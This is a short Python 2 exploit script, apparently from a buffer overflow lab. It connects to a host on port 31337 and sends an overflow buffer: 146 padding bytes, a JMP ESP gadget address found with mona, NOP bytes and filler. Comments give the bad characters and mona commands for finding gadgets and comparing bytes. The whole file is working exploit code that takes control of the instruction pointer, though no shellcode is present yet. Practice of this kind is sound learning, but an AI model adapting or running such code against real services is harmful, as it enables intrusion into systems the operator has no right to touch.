#!/usr/bin/env python2
import socket

RHOST="192.168.2.211"
RPORT=31337

badchar_test = ""
badchars = [0x00, 0x0A] #know in advance because of string input

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#find gardget locations
#!mona jmp -r esp -cpb "\x00\x0A"
#080414c3,080416bf
addr_jmp_esp=0x080414c3
import struct
addr_jmp_esp_LE=struct.pack("<I",addr_jmp_esp)
buf_totlen=1024
offset=146

buf=""
buf="A"*(offset - len(buf)) #probably not necessary to sub 0?
buf+= addr_jmp_esp_LE
buf+= "\x90\x90\x90\x90" #esp points here
buf+= "D"*(buf_totlen - len(buf)) # keep size the same
buf+="\n"

s.send(buf)

print("Send: {0}".format(buf))

data=s.recv(1024)
print("Received: {}".format(data))

#!mona compare -a esp -f c:\badchartest.bin
#to compare them
